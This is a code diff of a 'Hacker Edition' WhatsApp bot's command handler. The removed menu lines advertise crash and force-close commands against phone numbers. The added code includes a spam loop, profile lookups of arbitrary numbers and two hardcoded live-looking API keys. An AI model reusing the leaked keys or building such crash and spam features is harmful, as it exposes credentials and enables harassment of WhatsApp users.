-        // ==================== GET DP COMMAND ====================
-        case 'getdp': {
-          const targetNumber = args[0];
-          if (!targetNumber) {
-            await socket.sendMessage(from, { 
-              text: `⚠️ *Usage:* ${prefix}getdp <number>\n*Example:* ${prefix}getdp 9477xxxxxx` 
-            }, { quoted: msg });
-            return;
-          }
-          
-          const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-          const targetJid = `${cleanNumber}@s.whatsapp.net`;
-          
-          await socket.sendMessage(from, { text: `📸 *Fetching DP for* ${cleanNumber}...` }, { quoted: msg });
-          
-          try {
-            let ppUrl;
-            try {
-              ppUrl = await socket.profilePictureUrl(targetJid, 'image');
-            } catch (e) {
-              ppUrl = await socket.profilePictureUrl(targetJid);
-            }
-            
-            if (ppUrl) {
-              await socket.sendMessage(from, {
-                image: { url: ppUrl },
-                caption: `🖼️ *Display Picture*\n👤 *User:* ${cleanNumber}\n🔗 *Source:* WhatsApp Profile`
-              }, { quoted: msg });
-            } else {
-              await socket.sendMessage(from, { 
-                text: `❌ *No Display Picture Found!*\nUser ${cleanNumber} has no profile picture or has privacy enabled.` 
-              }, { quoted: msg });
-            }
-          } catch (error) {
-            console.error('Get DP error:', error);
-            await socket.sendMessage(from, { 
-              text: `❌ *Failed to fetch DP!*\n*Reason:* ${error.message || 'User not found or privacy restricted'}` 
-            }, { quoted: msg });
-          }
-          break;
-        }
-
-        // ==================== SET PROFILE PICTURE COMMAND ====================
-        case 'setpp':
-        case 'setpullpp': {
-          if (!isOwner) {
-            await socket.sendMessage(from, { text: '❌ *Access Denied!* Only owner can change profile picture.' }, { quoted: msg });
-            return;
-          }
-          
-          const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-          let imageBuffer = null;
-          
-          if (quotedMsg) {
-            if (quotedMsg.imageMessage) {
-              const stream = await downloadContentFromMessage(quotedMsg.imageMessage, 'image');
-              let buffer = Buffer.from([]);
-              for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
-              imageBuffer = buffer;
-            } else if (quotedMsg.videoMessage) {
-              const stream = await downloadContentFromMessage(quotedMsg.videoMessage, 'video');
-              let buffer = Buffer.from([]);
-              for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
-              imageBuffer = buffer;
-            }
-          }
-          
-          const imageUrl = args[0];
-          if (!imageBuffer && !imageUrl) {
-            await socket.sendMessage(from, { 
-              text: `⚠️ *Usage:* ${prefix}${command} <image_url> OR reply to an image/video\n*Example:* ${prefix}${command} https://example.com/image.jpg` 
-            }, { quoted: msg });
-            return;
-          }
-          
-          await socket.sendMessage(from, { text: '🔄 *Updating Profile Picture...*' }, { quoted: msg });
-          
-          try {
-            if (imageUrl && imageUrl.startsWith('http')) {
-              const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
-              imageBuffer = Buffer.from(response.data);
-            }
-            
-            const resizedImage = await resize(imageBuffer, 640, 640);
-            await socket.updateProfilePicture(socket.user.id, resizedImage);
-            
-            await socket.sendMessage(from, {
-              image: resizedImage,
-              caption: '✅ *Profile Picture Updated Successfully!*\n🖼️ New display picture has been set.'
-            }, { quoted: msg });
-          } catch (error) {
-            console.error('Set PP error:', error);
-            await socket.sendMessage(from, { 
-              text: `❌ *Failed to Update Profile Picture!*\n*Reason:* ${error.message || 'Invalid image format or size too large'}` 
-            }, { quoted: msg });
-          }
-          break;
-        }
-
-        // ==================== MENU COMMAND ====================
+        // ==================== MAIN MENU ====================
         case 'menu':
-        case 'help': {
-          const cfg = await loadUserConfigFromMongo(sanitized) || {};
-          const botName = cfg.botName || BOT_NAME_FANCY;
+        case 'help':
+        case 'cmds': {
+          await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          
+          const uptime = Math.floor((Date.now() - (socketCreationTime.get(number) || Date.now())) / 1000);
+          const hours = Math.floor(uptime / 3600);
+          const minutes = Math.floor((uptime % 3600) / 60);
+          const seconds = Math.floor(uptime % 60);
           
           const menuText = `
-*🏯𝐖ᴇʟᴄᴏᴍᴇ 𝐓ᴏ 𝐘ᴏᴜ x𝐂ᴅᴛ 𝐈ɴᴠɪᴄᴛᴜꜱ 𝐌ɪɴɪ 𝐁ᴏᴛ 🎭*
-*🎏x𝐂ᴅᴛ ɪɴᴠɪᴄᴛᴜꜱ ᴍɪɴɪ ʙᴏᴛミニボットへようこそ🎎*
+╔══════════════════════════════════╗
+║     💀 *${botName}* 💀      ║
+║   🔥 HACKER EDITION v3.0 🔥    ║
+╚══════════════════════════════════╝
 
-> *𝐁υg 𝐂σммαη∂ѕ*🎡
+┌──────────────────────────────────┐
+│         🤖 *BOT INFO* 🤖          │
+├──────────────────────────────────┤
+│ 🕐 Uptime: ${hours}h ${minutes}m ${seconds}s
+│ 👥 Active: ${activeSockets.size} session(s)
+│ 📌 Prefix: ${prefix}
+│ 👑 Owner: ${config.OWNER_NAME}
+└──────────────────────────────────┘
 
-\`❉ ᴛʏᴘᴇ ꜰᴏʀᴄʟᴏꜱᴇ ɪᴏꜱ\`
-*.fc-ios 9477xxxx*
-*.fc-delay 9477xxxx*
+┌──────────────────────────────────┐
+│       📍 *BASIC COMMANDS* 📍       │
+├──────────────────────────────────┤
+│ ${prefix}alive - 🟢 Bot status
+│ ${prefix}ping - 🏓 Check latency
+│ ${prefix}menu - 📋 Show menu
+│ ${prefix}owner - 👑 Owner info
+│ ${prefix}system - 💻 System info
+│ ${prefix}jid - 🆔 Get chat JID
+└──────────────────────────────────┘
 
-\`❉ ᴛʏᴘᴇ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ\`
-*.xcdt-crash 9477xxxx*
-*.crash-delta 9477xxxx*
-*.invictus 9477xxxx*
-*.crash-delay 9477xxxx*
+┌──────────────────────────────────┐
+│      🎵 *DOWNLOADER* 🎵           │
+├──────────────────────────────────┤
+│ ${prefix}song <name> - 🎧 Download song
+│ ${prefix}tt <url> - 📱 TikTok video
+│ ${prefix}fb <url> - 📘 Facebook video
+│ ${prefix}ig <url> - 📸 Instagram video
+└──────────────────────────────────┘
 
-\`❉ ꜱᴘᴀᴍ ᴄᴏᴍᴍᴀɴᴅ\`
-*.spam 9477xxxx "message" 10*
+┌──────────────────────────────────┐
+│      🛠️ *TOOLS* 🛠️                │
+├──────────────────────────────────┤
+│ ${prefix}getdp <number> - 🖼️ Get DP
+│ ${prefix}numberinfo <number> - 📊 Number info
+│ ${prefix}font <text> - ✨ Fancy font
+│ ${prefix}cid <link> - 📡 Get channel ID
+└──────────────────────────────────┘
 
-\`❉ ᴘʀᴏꜰɪʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\`
-*.getdp 9477xxxx*
-*.setpp <image_url>*
+┌──────────────────────────────────┐
+│      🤖 *AI FEATURES* 🤖          │
+├──────────────────────────────────┤
+│ ${prefix}ai <text> - 🧠 Chat with AI
+│ ${prefix}aiimg <prompt> - 🎨 AI image
+└──────────────────────────────────┘
 
-> *© ᴄʀᴀꜱʜ ᴅᴇʟᴛᴀ ʙᴇᴛᴀ ᴡᴀ ʙᴏᴛ 1.0.0 ᴘʀᴏ*
-> *● ᴡᴀʙᴏᴛ ʙʏ ᴏᴡɴᴇʀ ᴄᴅᴛ ᴍᴇᴍʙᴇʀꜱ*
+┌──────────────────────────────────┐
+│      ⚙️ *SETTINGS* ⚙️             │
+├──────────────────────────────────┤
+│ ${prefix}setlogo (reply to image) - 🖼️ Set logo
+│ ${prefix}setbotname <name> - 🤖 Set bot name
+│ ${prefix}setmode <mode> - 🔧 Set mode
+│ ${prefix}setprefix <symbol> - 🔣 Set prefix
+│ ${prefix}getmode - 📊 View mode
+│ ${prefix}showconfig - ⚙️ View config
+│ ${prefix}resetconfig - 🔄 Reset config
+│ ${prefix}deleteme - 🗑️ Delete session
+└──────────────────────────────────┘
 
-> *🌐 Wᴇʙ : Cᴏᴍɪɴɢ Sᴏᴏɴ*
-> *🎬 Tᴜᴛᴏʀɪᴀʟ : Cᴏᴍɪɴɢ Sᴏᴏɴ*
+┌──────────────────────────────────┐
+│      👥 *GROUP COMMANDS* 👥       │
+├──────────────────────────────────┤
+│ ${prefix}tagall <msg> - 📢 Tag all members
+│ ${prefix}hidetag <msg> - 👻 Hidden tag
+│ ${prefix}tagadmins - 👑 Tag admins
+│ ${prefix}gjid - 📋 Get group JID list
+│ ${prefix}online - 🟢 Check online members
+│ ${prefix}left <jid> - 🚪 Leave group(s)
+│ ${prefix}leave - 🚶 Leave current group
+│ ${prefix}savecontact <jid> - 💾 Save group contacts
+└──────────────────────────────────┘
 
-🚧 *w𝔞𝔯𝔫𝔦𝔫𝔤 - ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇꜱꜱ ᴡɪʟʟ ʙᴇ ʟᴏɢɢᴇᴅ ᴀɴᴅ ᴛʀᴀᴄᴇᴅ.!!*
-`;
-          await socket.sendMessage(sender, { text: menuText }, { quoted: msg });
+┌──────────────────────────────────┐
+│      💥 *HACKER TOOLS* 💥         │
+├──────────────────────────────────┤
+│ ${prefix}spam <count> <msg> - 💣 Spam message
+│ ${prefix}bug <number> - 🐛 Bug report
+└──────────────────────────────────┘
+
+┌──────────────────────────────────┐
+│      📰 *NEWS & CHANNELS* 📰      │
+├──────────────────────────────────┤
+│ ${prefix}newslist - 📑 List followed channels
+│ ${prefix}cid <link> - 🔍 Get channel ID
+└──────────────────────────────────┘
+
+╔══════════════════════════════════╗
+║   💀 ${botName} 💀   ║
+║   🔥 HACK THE SYSTEM! 🔥   ║
+╚══════════════════════════════════╝
+          `.trim();
+          
+          await sendLoadingAnimation(socket, sender, menuText, logo);
           break;
         }
-
+        
+        // ==================== ALIVE ====================
+        case 'alive': {
+          const uptime = Math.floor((Date.now() - (socketCreationTime.get(number) || Date.now())) / 1000);
+          const hours = Math.floor(uptime / 3600);
+          const minutes = Math.floor((uptime % 3600) / 60);
+          const seconds = Math.floor(uptime % 60);
+          
+          const text = `╭━━━❰ *💀 ${botName} 💀* ❱━━━❍
+┃
+┃ 🟢 *Status:* Online & Ready
+┃ 👑 *Owner:* ${config.OWNER_NAME}
+┃ ⏳ *Uptime:* ${hours}h ${minutes}m ${seconds}s
+┃ 📌 *Prefix:* ${prefix}
+┃ 💫 *Version:* ${config.BOT_VERSION}
+┃
+┃ 💀 *"Hack the System!"* 💀
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          
+          await sendLoadingAnimation(socket, sender, text, logo);
+          await sendVoiceWithMessage(socket, sender, `Bot is online and ready to hack. Uptime ${hours} hours ${minutes} minutes.`, logo);
+          break;
+        }
+        
+        // ==================== PING ====================
+        case 'ping': {
+          const latency = Date.now() - (msg.messageTimestamp * 1000 || Date.now());
+          const text = `🏓 *Pong!*\n⏱️ *Latency:* ${latency}ms\n🟢 *Status:* Online\n💀 *Hacker Bot Active*`;
+          await sendLoadingAnimation(socket, sender, text, logo);
+          await sendVoiceWithMessage(socket, sender, `Pong! Latency ${latency} milliseconds.`, logo);
+          break;
+        }
+        
+        // ==================== OWNER ====================
+        case 'owner': {
+          const text = `╭━━━❰ *👑 OWNER INFO* ❱━━━❍
+┃
+┃ 📛 *Name:* ${config.OWNER_NAME}
+┃ 📞 *Contact:* +${config.OWNER_NUMBER}
+┃ 💫 *Bot:* ${BOT_NAME_FANCY}
+┃ 📌 *Version:* ${config.BOT_VERSION}
+┃
+┃ 💀 *For support or queries,* 
+┃ 💀 *contact the owner directly.*
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          await sendLoadingAnimation(socket, sender, text, logo);
+          break;
+        }
+        
+        // ==================== SYSTEM ====================
+        case 'system': {
+          const text = `╭━━━❰ *💻 SYSTEM INFO* ❱━━━❍
+┃
+┃ 💀 *OS:* ${os.type()} ${os.release()}
+┃ 🔱 *Platform:* ${os.platform()}
+┃ 🧠 *CPU Cores:* ${os.cpus().length}
+┃ 💾 *Total RAM:* ${(os.totalmem()/1024/1024/1024).toFixed(2)} GB
+┃ 📊 *Free RAM:* ${(os.freemem()/1024/1024/1024).toFixed(2)} GB
+┃ ✨ *Bot:* ${BOT_NAME_FANCY}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          await sendLoadingAnimation(socket, sender, text, logo);
+          break;
+        }
+        
+        // ==================== JID ====================
+        case 'jid': {
+          await sendLoadingAnimation(socket, sender, `🆔 *Chat JID:*\n┗━━ ${sender}`, logo);
+          break;
+        }
+        
+        // ==================== GET DP ====================
+        case 'getdp': {
+          let q = args[0];
+          if (!q) {
+            await sendLoadingAnimation(socket, sender, "❌ *Please provide a number!*\n📌 Usage: .getdp <number>", logo);
+            return;
+          }
+          
+          let jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+          let ppUrl;
+          try {
+            ppUrl = await socket.profilePictureUrl(jid, "image");
+          } catch {
+            ppUrl = "https://files.catbox.moe/xveuc2.jpg";
+          }
+          
+          await sendLoadingAnimation(socket, sender, `🖼️ *Profile Picture of* +${q}\n💀 *Fetched by ${BOT_NAME_FANCY}*`, ppUrl);
+          break;
+        }
+        
+        // ==================== NUMBER INFO ====================
+        case 'numberinfo':
+        case 'numinfo':
+        case 'ni': {
+          let q = args[0];
+          if (!q) {
+            await sendLoadingAnimation(socket, sender, "❌ *Please provide a number!*\n📌 Usage: .numberinfo <number>\n💀 Example: .numberinfo 94789226570", logo);
+            return;
+          }
+          
+          await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });
+          
+          const { infoText, ppUrl, hasDp } = await getNumberInfo(q, socket);
+          
+          if (hasDp && ppUrl) {
+            await sendLoadingAnimation(socket, sender, infoText, ppUrl);
+          } else {
+            await sendLoadingAnimation(socket, sender, infoText, logo);
+          }
+          break;
+        }
+        
+        // ==================== SET LOGO ====================
+        case 'setlogo': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const senderNum = (nowsender || '').split('@')[0];
+          const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
+          
+          if (senderNum !== sanitized && senderNum !== ownerNum) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*\nOnly session owner can change logo.', logo);
+            return;
+          }
+          
+          const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+          if (!quoted || !quoted.imageMessage) {
+            await sendLoadingAnimation(socket, sender, "❌ *Reply to an image!*\n📌 Usage: Reply to an image with .setlogo", logo);
+            return;
+          }
+          
+          try {
+            const media = await downloadQuotedMedia(quoted);
+            if (!media || !media.buffer) {
+              await sendLoadingAnimation(socket, sender, "❌ *Failed to download image!*", logo);
+              return;
+            }
+            
+            const sessionPath = path.join(SESSIONS_DIR, `session_${sanitized}`);
+            fs.ensureDirSync(sessionPath);
+            const logoPath = path.join(sessionPath, `logo.jpg`);
+            fs.writeFileSync(logoPath, media.buffer);
+            
+            let cfg = await loadUserConfigFromFile(sanitized) || {};
+            cfg.logo = logoPath;
+            await setUserConfigInFile(sanitized, cfg);
+            
+            await sendLoadingAnimation(socket, sender, "✅ *Logo updated successfully!*\n💀 New logo will be used for this session.", logoPath);
+          } catch (e) {
+            await sendLoadingAnimation(socket, sender, `❌ *Error:* ${e.message}`, logo);
+          }
+          break;
+        }
+        
+        // ==================== SET PREFIX ====================
+        case 'setprefix': {
+          const senderNum = (nowsender || '').split('@')[0];
+          const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
+          
+          if (!isOwner && senderNum !== ownerNum) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*\nOnly bot owner can change prefix.', logo);
+            return;
+          }
+          
+          const newPrefix = args[0];
+          if (!newPrefix) {
+            await sendLoadingAnimation(socket, sender, `❌ *Please provide a prefix!*\n📌 Usage: .setprefix .\n💀 Current prefix: ${prefix}`, logo);
+            return;
+          }
+          
+          await setPrefixForChat(from, newPrefix);
+          await sendLoadingAnimation(socket, sender, `✅ *Prefix changed!*\n🔣 New prefix: \`${newPrefix}\``, logo);
+          break;
+        }
+        
+        // ==================== SET BOT NAME ====================
+        case 'setbotname': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const senderNum = (nowsender || '').split('@')[0];
+          const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
+          
+          if (senderNum !== sanitized && senderNum !== ownerNum) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*\nOnly session owner can change bot name.', logo);
+            return;
+          }
+          
+          const name = args.join(' ').trim();
+          if (!name) {
+            await sendLoadingAnimation(socket, sender, '❌ *Provide a name!*\n📌 Usage: .setbotname My Bot Name', logo);
+            return;
+          }
+          
+          let cfg = await loadUserConfigFromFile(sanitized) || {};
+          cfg.botName = name;
+          await setUserConfigInFile(sanitized, cfg);
+          await sendLoadingAnimation(socket, sender, `✅ *Bot name set to:* ${name}`, logo);
+          break;
+        }
+        
+        // ==================== SET MODE ====================
+        case 'setmode': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const senderNum = (nowsender || '').split('@')[0];
+          const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
+          
+          if (senderNum !== sanitized && senderNum !== ownerNum) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*\nOnly session owner can change mode.', logo);
+            return;
+          }
+          
+          const modeArg = (args[0] || '').toLowerCase();
+          const allowed = ['private', 'inbox', 'groups', 'public'];
+          
+          if (!modeArg || !allowed.includes(modeArg)) {
+            await sendLoadingAnimation(socket, sender, '❌ *Invalid mode!*\n📌 Available: public, private, inbox, groups', logo);
+            return;
+          }
+          
+          let cfg = await loadUserConfigFromFile(sanitized) || {};
+          cfg.mode = modeArg;
+          await setUserConfigInFile(sanitized, cfg);
+          await sendLoadingAnimation(socket, sender, `✅ *Mode updated to:* ${modeArg.toUpperCase()}`, logo);
+          break;
+        }
+        
+        // ==================== GET MODE ====================
+        case 'getmode': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const cfg = await loadUserConfigFromFile(sanitized) || {};
+          const mode = cfg.mode || config.MODE || 'public';
+          await sendLoadingAnimation(socket, sender, `🔧 *Current Mode:* ${mode.toUpperCase()}`, logo);
+          break;
+        }
+        
+        // ==================== SHOW CONFIG ====================
+        case 'showconfig': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const cfg = await loadUserConfigFromFile(sanitized) || {};
+          const botNameCfg = cfg.botName || BOT_NAME_FANCY;
+          const mode = cfg.mode || config.MODE || 'public';
+          
+          const text = `╭━━━❰ *⚙️ CONFIGURATION* ❱━━━❍
+┃
+┃ 🤖 *Bot Name:* ${botNameCfg}
+┃ 🔧 *Mode:* ${mode.toUpperCase()}
+┃ 📌 *Prefix:* ${prefix}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          await sendLoadingAnimation(socket, sender, text, logo);
+          break;
+        }
+        
+        // ==================== RESET CONFIG ====================
+        case 'resetconfig': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const senderNum = (nowsender || '').split('@')[0];
+          const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
+          
+          if (senderNum !== sanitized && senderNum !== ownerNum) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*', logo);
+            return;
+          }
+          
+          await setUserConfigInFile(sanitized, {});
+          await sendLoadingAnimation(socket, sender, '✅ *Config reset to defaults!*', logo);
+          break;
+        }
+        
+        // ==================== DELETE SESSION ====================
+        case 'deleteme': {
+          const sanitized = (number || '').replace(/[^0-9]/g, '');
+          const senderNum = (nowsender || '').split('@')[0];
+          const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
+          
+          if (senderNum !== sanitized && senderNum !== ownerNum) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*', logo);
+            return;
+          }
+          
+          await sendLoadingAnimation(socket, sender, '⚠️ *Deleting session...*', logo);
+          await removeSessionFromFile(sanitized);
+          await removeNumberFromFile(sanitized);
+          activeSockets.delete(sanitized);
+          socketCreationTime.delete(sanitized);
+          await socket.sendMessage(sender, { text: '✅ *Session deleted!*\n💀 Bot will logout now.' });
+          setTimeout(async () => {
+            try { await socket.logout(); } catch(e) {}
+            try { socket.ws?.close(); } catch(e) {}
+          }, 2000);
+          break;
+        }
+        
+        // ==================== SONG DOWNLOAD ====================
+        case 'song':
+        case 'music': {
+          const yts = require('yt-search');
+          const query = args.join(" ").trim();
+          
+          if (!query) {
+            await sendLoadingAnimation(socket, sender, '🎵 *Please provide a song name or YouTube link!*\n📌 Usage: .song Song Name', logo);
+            return;
+          }
+          
+          await socket.sendMessage(sender, { react: { text: '🎵', key: msg.key } });
+          
+          let ytUrl = query;
+          if (!/^https?:\/\//i.test(query)) {
+            const search = await yts(query);
+            if (!search || !search.videos || search.videos.length === 0) {
+              await sendLoadingAnimation(socket, sender, '❌ *No results found!*', logo);
+              return;
+            }
+            ytUrl = search.videos[0].url;
+          }
+          
+          const apiUrl = `https://api.srihub.store/download/ytmp3?apikey=dew_EtVuyJGtlCzvZY44TP6MbXpPlAltC6VH2uGOPAJL&url=${encodeURIComponent(ytUrl)}`;
+          const apiRes = await axios.get(apiUrl, { timeout: 15000 }).then(r => r.data).catch(e => null);
+          
+          if (!apiRes || (!apiRes.downloadUrl && !apiRes.result?.download?.url)) {
+            await sendLoadingAnimation(socket, sender, '❌ *Failed to get download link!*', logo);
+            return;
+          }
+          
+          const downloadUrl = apiRes.downloadUrl || apiRes.result?.download?.url;
+          const title = apiRes.title || apiRes.result?.title || 'Unknown Title';
+          
+          await sendLoadingAnimation(socket, sender, `🎵 *${title}*\n💀 *Downloaded by ${BOT_NAME_FANCY}*`, logo);
+          
+          await socket.sendMessage(sender, {
+            audio: { url: downloadUrl },
+            mimetype: 'audio/mpeg',
+            ptt: false
+          });
+          break;
+        }
+        
+        // ==================== AI CHAT ====================
+        case 'ai':
+        case 'chat':
+        case 'gpt': {
+          const q = args.join(" ").trim();
+          if (!q) {
+            await sendLoadingAnimation(socket, sender, '🤖 *Please provide a message for AI!*\n📌 Usage: .ai Your question', logo);
+            return;
+          }
+          
+          await socket.sendMessage(sender, { react: { text: '🤖', key: msg.key } });
+          
+          const payload = { contents: [{ parts: [{ text: q }] }] };
+          const { data } = await axios.post(
+            `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyDD79CzhemWoS4WXoMTpZcs8g0fWNytNug`,
+            payload,
+            { headers: { "Content-Type": "application/json" } }
+          );
+          
+          if (!data?.candidates?.[0]?.content?.parts?.[0]?.text) {
+            await sendLoadingAnimation(socket, sender, '❌ *AI reply not found!*', logo);
+            return;
+          }
+          
+          const aiReply = data.candidates[0].content.parts[0].text;
+          await sendLoadingAnimation(socket, sender, `🤖 *AI Response:*\n\n${aiReply}\n\n💀 ${BOT_NAME_FANCY}`, logo);
+          break;
+        }
+        
+        // ==================== FONT ====================
+        case 'font': {
+          const text = args.join(" ").trim();
+          if (!text) {
+            await sendLoadingAnimation(socket, sender, '✨ *Please provide text to convert!*\n📌 Usage: .font Hello', logo);
+            return;
+          }
+          
+          const apiUrl = `https://www.dark-yasiya-api.site/other/font?text=${encodeURIComponent(text)}`;
+          const response = await axios.get(apiUrl);
+          
+          if (!response.data.status || !response.data.result) {
+            await sendLoadingAnimation(socket, sender, "❌ *Error fetching fonts!*", logo);
+            return;
+          }
+          
+          const fontList = response.data.result.slice(0, 8)
+            .map(font => `*${font.name}:*\n${font.result}`)
+            .join("\n\n");
+          
+          await sendLoadingAnimation(socket, sender, `✨ *Fancy Fonts*\n\n${fontList}\n\n💀 ${BOT_NAME_FANCY}`, logo);
+          break;
+        }
+        
+        // ==================== CHANNEL ID ====================
+        case 'cid':
+        case 'channelid': {
+          const link = args[0];
+          if (!link) {
+            await sendLoadingAnimation(socket, sender, "❌ *Please provide a WhatsApp Channel link!*\n📌 Usage: .cid https://whatsapp.com/channel/xxxxx", logo);
+            return;
+          }
+          
+          const match = link.match(/whatsapp\.com\/channel\/([\w-]+)/);
+          if (!match) {
+            await sendLoadingAnimation(socket, sender, "⚠️ *Invalid channel link format!*", logo);
+            return;
+          }
+          
+          const inviteId = match[1];
+          
+          try {
+            const metadata = await socket.newsletterMetadata("invite", inviteId);
+            if (!metadata || !metadata.id) {
+              await sendLoadingAnimation(socket, sender, '❌ *Channel not found!*', logo);
+              return;
+            }
+            
+            const text = `╭━━━❰ *📡 CHANNEL INFO* ❱━━━❍
+┃
+┃ 🆔 *ID:* ${metadata.id}
+┃ 📌 *Name:* ${metadata.name}
+┃ 👥 *Followers:* ${metadata.subscribers?.toLocaleString() || 'N/A'}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+            
+            if (metadata.preview) {
+              await sendLoadingAnimation(socket, sender, text, `https://pps.whatsapp.net${metadata.preview}`);
+            } else {
+              await sendLoadingAnimation(socket, sender, text, logo);
+            }
+          } catch (err) {
+            await sendLoadingAnimation(socket, sender, `❌ *Error:* ${err.message}`, logo);
+          }
+          break;
+        }
+        
+        // ==================== SPAM ====================
+        case 'spam':
+        case 'spm': {
+          if (!isOwner) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*\n💀 Only bot owner can use spam command.', logo);
+            return;
+          }
+          
+          const count = parseInt(args[0]);
+          const message = args.slice(1).join(" ");
+          
+          if (!count || !message || count > 50) {
+            await sendLoadingAnimation(socket, sender, "❌ *Usage:* .spam <count> <message>\n📌 Example: .spam 10 Hello\n💀 Max count: 50", logo);
+            return;
+          }
+          
+          await sendLoadingAnimation(socket, sender, `💀 *Starting spam ${count} times...*`, logo);
+          
+          for (let i = 0; i < count; i++) {
+            await socket.sendMessage(sender, { text: message });
+            await delay(500);
+          }
+          
+          await sendLoadingAnimation(socket, sender, `✅ *Spam completed!* ${count} messages sent.`, logo);
+          break;
+        }
+        
+        // ==================== BUG REPORT ====================
+        case 'bug':
+        case 'report': {
+          const bugDesc = args.join(" ").trim();
+          if (!bugDesc) {
+            await sendLoadingAnimation(socket, sender, "🐛 *Please describe the bug!*\n📌 Usage: .bug Something is wrong...", logo);
+            return;
+          }
+          
+          const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
+          const reportText = `╭━━━❰ *🐛 BUG REPORT* ❱━━━❍
+┃
+┃ 👤 *Reported by:* ${senderNumber}
+┃ 🕐 *Time:* ${getSriLankaTimestamp()}
+┃ 📝 *Description:* ${bugDesc}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          
+          await sendLoadingAnimation(socket, ownerJid, reportText, logo);
+          await sendLoadingAnimation(socket, sender, "✅ *Bug report sent to owner!*\n💀 Thank you for reporting.", logo);
+          break;
+        }
+        
+        // ==================== TAG ALL ====================
+        case 'tagall': {
+          if (!isGroup) {
+            await sendLoadingAnimation(socket, sender, '❌ *This command only works in groups!*', logo);
+            return;
+          }
+          
+          const groupMeta = await socket.groupMetadata(from);
+          const participants = groupMeta.participants || [];
+          const mentions = participants.map(p => p.id);
+          const message = args.length ? args.join(" ") : "📢 Announcement";
+          
+          const text = `╭━━━❰ *📢 GROUP ANNOUNCEMENT* ❱━━━❍
+┃
+┃ 💬 *Message:* ${message}
+┃ 👥 *Members:* ${participants.length}
+┃
+┃ *Tagging all members:*
+┃
+${mentions.map((m, i) => `┃ ${i+1}. @${m.split('@')[0]}`).join('\n')}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍
+💀 ${BOT_NAME_FANCY}`;
+          
+          await socket.sendMessage(from, { text: text, mentions: mentions });
+          break;
+        }
+        
+        // ==================== HIDE TAG ====================
+        case 'hidetag':
+        case 'h': {
+          if (!isGroup) {
+            await sendLoadingAnimation(socket, sender, '❌ *This command only works in groups!*', logo);
+            return;
+          }
+          
+          const groupMeta = await socket.groupMetadata(from);
+          const participants = groupMeta.participants || [];
+          const mentions = participants.map(p => p.id);
+          const message = args.length ? args.join(" ") : "👻 Hidden Tag";
+          
+          await socket.sendMessage(from, { text: message, mentions: mentions });
+          break;
+        }
+        
+        // ==================== TAG ADMINS ====================
+        case 'tagadmins': {
+          if (!isGroup) {
+            await sendLoadingAnimation(socket, sender, '❌ *This command only works in groups!*', logo);
+            return;
+          }
+          
+          const groupMeta = await socket.groupMetadata(from);
+          const admins = (groupMeta.participants || []).filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id);
+          
+          if (admins.length === 0) {
+            await sendLoadingAnimation(socket, sender, '❌ *No admins found!*', logo);
+            return;
+          }
+          
+          const message = args.length ? args.join(" ") : "👑 Attention Admins!";
+          const text = `╭━━━❰ *👑 ADMIN MENTION* ❱━━━❍
+┃
+┃ 💬 *Message:* ${message}
+┃ 👑 *Admins:* ${admins.length}
+┃
+${admins.map((a, i) => `┃ ${i+1}. @${a.split('@')[0]}`).join('\n')}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          
+          await socket.sendMessage(from, { text: text, mentions: admins });
+          break;
+        }
+        
+        // ==================== GROUP JID LIST ====================
+        case 'gjid':
+        case 'grouplist': {
+          if (!isOwner) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*\n💀 Only bot owner can use this.', logo);
+            return;
+          }
+          
+          const groups = await socket.groupFetchAllParticipating();
+          const groupArray = Object.values(groups);
+          
+          if (groupArray.length === 0) {
+            await sendLoadingAnimation(socket, sender, '❌ *No groups found!*', logo);
+            return;
+          }
+          
+          let text = `╭━━━❰ *📋 GROUP JID LIST* ❱━━━❍\n┃\n`;
+          groupArray.forEach((g, i) => {
+            text += `┃ ${i+1}. *${g.subject || 'Unknown'}*\n┃    🆔 ${g.id}\n┃\n`;
+          });
